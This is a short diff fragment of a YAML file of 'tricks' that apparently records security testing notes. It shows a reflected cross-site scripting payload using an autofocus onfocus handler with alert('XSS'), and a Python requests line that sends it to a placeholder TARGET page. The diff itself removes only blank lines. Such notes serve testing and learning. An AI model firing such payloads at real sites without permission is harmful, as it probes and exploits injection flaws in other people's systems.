@@ -38,5 +38,3 @@ tricks:
     payload: |
       payload = "<zz onfocus=alert('XSS') autofocus tabindex=1>"
       requests.get('http://TARGET/page', params={'name': payload})
-
-
